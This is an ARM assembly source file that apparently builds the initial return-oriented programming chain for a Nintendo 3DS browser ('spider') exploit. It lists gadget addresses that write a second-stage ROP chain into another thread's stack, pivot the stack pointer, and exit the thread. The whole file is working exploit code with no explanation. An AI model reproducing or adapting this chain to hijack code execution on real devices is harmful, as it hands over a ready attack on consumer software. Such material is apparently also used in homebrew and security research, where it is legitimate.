.nds

.include "../../build/constants.s"

.create "spider_initial_rop.bin",0x0

THREAD0TO_ADR equ 0x0FFFFF7C

.orga 0x0
	.word 0xDEADC0DE
.orga 0x4
	;actual ROP start

	; ;infinite loop for debugging
	; .word 0x00279a28 ; pop {lr, pc}
	; 	.word SPIDER_INITIALROP_VADR ; lr => sp
	; .word 0x00279a24 ; mov sp, lr | pop {lr, pc}

	;write thread0 initial rop
		.word 0x001db064 ; pop	{r4, r5, r6, r7, r8, pc}
			.word 0xDEADC0DE
			.word 0xDEADC0DE
			.word 0xDEADC0DE
			.word 0xDEADC0DE
			.word 0xDEADC0DE

		.word 0x001db77c ; pop {r4, pc}

			.word THREAD0TO_ADR ; r4
		.word 0x002954e8 ; pop {r0, pc}
			.word 0x00279a28 ; r0 (pop {lr, pc})
		.word 0x0026bca0 ; str r0, [r4] | pop {r4, pc}

			.word THREAD0TO_ADR+0x4 ; r4
		.word 0x002954e8 ; pop {r0, pc}
			.word SPIDER_THREAD0ROP_VADR ; r0
		.word 0x0026bca0 ; str r0, [r4] | pop {r4, pc}

			.word THREAD0TO_ADR+0x8 ; r4
		.word 0x002954e8 ; pop {r0, pc}
			.word 0x00279a24 ; r0 (mov sp, lr | pop {lr, pc})
		.word 0x0026bca0 ; str r0, [r4] | pop {r4, pc}
			.word 0xDEADC0DE ; r4 (garbage)

	.word 0x0026A600 ; svcExitThread

.Close
